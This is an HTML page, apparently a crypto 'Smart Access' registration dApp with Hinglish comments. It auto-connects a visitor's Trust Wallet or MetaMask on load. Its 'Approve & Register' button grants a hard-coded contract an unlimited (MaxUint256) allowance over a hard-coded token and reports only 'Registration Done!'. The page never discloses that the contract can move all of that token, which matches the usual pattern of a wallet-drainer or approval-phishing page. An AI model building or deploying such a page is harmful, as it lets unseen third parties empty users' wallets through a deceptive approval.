<!DOCTYPE html>
<html>
<head>
    <title>Smart Access Final</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
        .w-btn { border: 2px solid #eee; border-radius: 15px; padding: 15px; cursor: pointer; margin: 10px; transition: 0.3s; display: inline-block; width: 100px; }
        .w-btn img { width: 50px; }
        #dashboard { display: none; }
        .action-btn { background: #4CAF50; color: white; padding: 18px; width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        .status { font-size: 12px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div id="connectView">
        <h3>Connect Wallet</h3>
        <p style="font-size: 12px; color: #888;">Niche icon par click karein aur App ke khulne ka wait karein.</p>
        <div class="w-btn" onclick="openTrust()">
            <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"><br>
            <small>Trust Wallet</small>
        </div>
        <div class="w-btn" onclick="openMM()">
            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"><br>
            <small>MetaMask</small>
        </div>
    </div>

    <div id="dashboard">
        <h2 style="color: #2196F3;">Dashboard Active</h2>
        <p id="userAddr" style="font-size: 10px; background: #eee; padding: 10px; word-break: break-all; border-radius: 10px;"></p>
        <button id="regBtn" class="action-btn" onclick="register()">Approve & Register</button>
    </div>
    
    <div id="msg" class="status"></div>
</div>

<script>
    const CONTRACT = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    let signer;

    // 1. Mobile Chrome se App kholne ka logic
    function openTrust() {
        const url = window.location.href;
        window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
    }
    
    function openMM() {
        const url = window.location.href.replace(/^https?:\/\//, '');
        window.location.href = "https://metamask.app.link/dapp/" + url;
    }

    // 2. Wallet Connection logic (Jo automatic chalega)
    async function connectAuto() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const accounts = await provider.send("eth_requestAccounts", []);
                
                if (accounts.length > 0) {
                    signer = provider.getSigner();
                    const addr = await signer.getAddress();
                    
                    document.getElementById('connectView').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'block';
                    document.getElementById('userAddr').innerText = "Wallet: " + addr;
                }
            } catch (e) {
                document.getElementById('msg').innerText = "Please Approve Connection in Wallet App";
            }
        }
    }

    // --- SABSE ZAROORI PART ---
    // Yeh check karta hai ki kya hum Trust/MetaMask browser ke andar hain?
    window.addEventListener('load', () => {
        if (window.ethereum) {
            // Agar window.ethereum mil gaya (matlab hum wallet browser mein hain), toh auto-connect karo
            setTimeout(connectAuto, 500); 
        }
    });

    async function register() {
        const btn = document.getElementById('regBtn');
        try {
            btn.innerText = "Processing...";
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(CONTRACT, ["function register() external"], signer);

            const tx1 = await tCon.approve(CONTRACT, ethers.constants.MaxUint256);
            await tx1.wait();

            const tx2 = await mCon.register();
            await tx2.wait();

            alert("Registration Done!");
            btn.innerText = "Registered âœ…";
        } catch (e) {
            alert("Transaction Failed!");
            btn.innerText = "Register & Access";
        }
    }
</script>
</body>
</html>
